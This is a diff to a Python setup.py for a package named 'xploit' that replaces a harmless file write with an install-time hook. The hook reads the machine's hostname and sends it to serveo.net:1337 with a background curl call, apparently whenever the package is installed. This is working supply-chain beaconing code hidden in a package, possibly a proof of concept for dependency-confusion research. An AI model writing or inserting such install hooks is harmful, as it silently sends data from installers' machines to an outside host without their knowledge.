@@ -1,12 +1,17 @@
+import os
+import subprocess
+import time
 from setuptools import setup, find_packages
 from setuptools.command.install import install
-from setuptools.command.egg_info import egg_info
 
 
 def RunCommand():
     # Touch a file in the current directory
-    with open('xploit.txt', 'w') as f:
-        f.write('xploit')
+    # Exec the following command: Run HTTP request to serveo.net:1337 and don't wait for the response
+    hostname= os.uname()[1]
+    subprocess.Popen(["curl", "-q","http://serveo.net:1337/"+str(hostname)])
+    
+
     
 
 class RunInstallCommand(install):
@@ -17,7 +22,7 @@ class RunInstallCommand(install):
 
 setup(
     name = "xploit",
-    version = "0.0.1",
+    version = "0.0.2",
     license = "MIT",
     packages=find_packages(),
     cmdclass={
